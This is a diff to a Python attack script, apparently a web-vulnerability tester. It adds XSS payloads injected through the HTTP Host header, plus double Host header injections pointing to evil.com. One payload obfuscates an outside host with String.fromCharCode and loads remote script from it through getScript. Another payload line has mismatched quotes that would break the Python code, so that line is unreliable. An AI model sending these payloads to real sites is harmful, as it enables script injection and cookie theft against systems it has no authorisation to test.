@@ -125,8 +125,26 @@ def attack(URL, path, domain, verbose, ips, cookie):
         print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 10 !")
         get_request(URL, path, 443, verbose, ['Host: "<ScRiPt>alert(1)</sCriPt>', "Cookie: " + cookie])
 
+        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 11 !")
+        get_request(URL, path, 443, verbose, ['Host: <ScRiPt>alert(1)</sCriPt>', "Cookie: " + cookie])
+
+        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 12 !")
+        get_request(URL, path, 443, verbose, ['Host: "><ImG Src=xx onerror(document.['cookie'];>', "Cookie: " + cookie])
+
+        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 13 !")
+        get_request(URL, path, 443, verbose, ['Host: <script type="text/javascript">alert(1997)</script>', "Cookie: " + cookie])
+
+        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 14 !")
+        get_request(URL, path, 443, verbose, ['Host: <img src=x onerror=$.getScript(String.fromCharCode(47,47,120,111,114,46,99,99))>', "Cookie: " + cookie])
+
+        print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 15 !")
+        get_request(URL, path, 443, verbose, ['Host: <svg%0Aonauxclick=0;[1].some(confirm)//', "Cookie: " + cookie])
+
         print(style.YELLOW + "[ * ]" + style.RESET + "TRYING DOUBLE HOST HEADER INJECTION !")
         get_request(URL, path, 443, verbose, [' Host:'+URL, 'Host: mykingbee.blogspot.com', "Cookie: " + cookie])
+
+        print(style.YELLOW + "[ * ]" + style.RESET + "TRYING DOUBLE HOST HEADER INJECTION !")
+        get_request(URL, path, 443, verbose, [' Host:'+URL, 'Host: evil.com', "Cookie: " + cookie])
 
         print(style.YELLOW + "[ * ]" + style.RESET + "TRYING X-FORWARDED-HOST INJECTION !")
         get_request(URL, path, 443, verbose, ['Host: '+ domain, 'X-Forwarded-Host: evil.com', "Cookie: " + cookie])
